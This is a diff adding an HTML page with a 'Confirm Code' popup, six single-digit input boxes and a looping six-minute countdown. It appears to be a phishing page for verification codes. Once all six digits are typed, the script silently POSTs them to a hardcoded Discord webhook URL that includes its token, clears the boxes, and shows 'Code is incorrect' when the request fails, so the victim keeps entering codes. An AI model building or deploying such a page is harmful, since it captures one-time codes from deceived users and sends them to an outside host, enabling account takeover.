@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Popup Countdown with Webhook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: black; /* Set body background to black */
+            color: white; /* Set text color to white */
+        }
+
+        .dialog-overlay {
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .dialog-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5); /* Shadow effect */
+            text-align: center;
+        }
+
+        #countdown {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .input-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .input-box {
+            width: 40px; /* Adjusted width */
+            height: 40px; /* Adjusted height */
+            margin: 0 5px; /* Adjusted margin */
+            padding: 10px;
+            font-size: 18px;
+            text-align: center;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            color: black; /* Text color for input boxes */
+        }
+
+        #error-message {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="dialog-overlay" id="popup">
+        <div class="dialog-box">
+            <h2>Countdown: <span id="countdown">6:00</span> minutes</h2>
+            <h3>Confirm Code</h3>
+            <div class="input-row" id="code-container">
+                <input type="text" class="input-box" maxlength="1" required>
+                <input type="text" class="input-box" maxlength="1" required>
+                <input type="text" class="input-box" maxlength="1" required>
+                <input type="text" class="input-box" maxlength="1" required>
+                <input type="text" class="input-box" maxlength="1" required>
+                <input type="text" class="input-box" maxlength="1" required>
+            </div>
+            <div id="error-message"></div>
+        </div>
+    </div>
+
+    <script>
+        "use strict";
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const countdownElement = document.getElementById('countdown');
+            const errorMessage = document.getElementById('error-message');
+            const inputs = document.querySelectorAll('.input-box');
+            const webhookURL = 'https://discordapp.com/api/webhooks/1237032989645602846/kK-el7zY32vVJo5gWPLqDZFnAdfKqJ9DvWdJsK7Nit_-AvIKklPVyq-Q7mNGm6UGo_4u';
+            
+            let countdown;
+            let countdownValue = 6 * 60; // 6 minutes in seconds
+
+            function startCountdown() {
+                countdownValue = 6 * 60;
+                updateCountdownDisplay();
+                countdown = setInterval(() => {
+                    countdownValue--;
+                    updateCountdownDisplay();
+                    if (countdownValue <= 0) {
+                        clearInterval(countdown);
+                        startCountdown();
+                    }
+                }, 1000);
+            }
+
+            function updateCountdownDisplay() {
+                const minutes = Math.floor(countdownValue / 60);
+                const seconds = countdownValue % 60;
+                countdownElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            }
+
+            function sendCode() {
+                const message = Array.from(inputs).map(input => input.value).join('');
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: message })
+                }).then(response => {
+                    clearInputs();
+                    if (!response.ok) {
+                        errorMessage.textContent = 'Code is incorrect';
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    errorMessage.textContent = 'Code is incorrect';
+                    clearInputs();
+                });
+            }
+
+            function clearInputs() {
+                inputs.forEach(input => {
+                    input.value = '';
+                });
+                inputs[0].focus();
+            }
+
+            startCountdown();
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        } else {
+                            sendCode();
+                        }
+                    }
+                });
+
+                input.addEventListener('keydown', (event) => {
+                    if (event.key === 'Backspace' && input.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
